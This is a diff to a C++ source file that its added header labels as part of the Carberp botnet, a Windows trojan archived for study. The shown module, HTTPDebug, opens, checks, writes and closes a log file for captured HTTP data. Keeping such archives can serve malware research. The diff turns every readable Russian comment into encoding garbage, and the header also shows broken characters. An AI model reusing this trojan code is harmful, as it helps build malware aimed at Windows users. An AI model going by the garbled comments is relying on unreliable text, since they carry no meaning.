@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 
@@ -19,7 +30,7 @@ DWORD   HTTPDebugThread = 0;
 
 HANDLE HTTPDebug::Initialize(PCHAR FileName)
 {
-	// Функция инициализирует файл для записи HTTPданных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ HTTPпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (IsNewProcess(HTTPDebugPID))
 	{
 		HTTPDebugHandle = NULL;
@@ -43,7 +54,7 @@ HANDLE HTTPDebug::Initialize(PCHAR FileName)
 
 void HTTPDebug::Close()
 {
-	// Close - Закрыть отладку
+	// Close - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Active())
 	{
 		pCloseHandle(HTTPDebugHandle);
@@ -55,8 +66,8 @@ void HTTPDebug::Close()
 
 bool HTTPDebug::Active()
 {
-	//	Функция вернёт истину если активна система
-	//	протоколирования данных
+	//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD ThreadID = (DWORD)GetCurrentThreadId();
 	if (IsNewProcess(HTTPDebugPID))
 	{
@@ -70,7 +81,7 @@ bool HTTPDebug::Active()
 
 DWORD HTTPDebug::Write(LPVOID Buf, DWORD BufSize)
 {
-	//  Функция записывает данные в открытый файл
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (!Active() || Buf == NULL || BufSize == 0)
 		return 0;
 
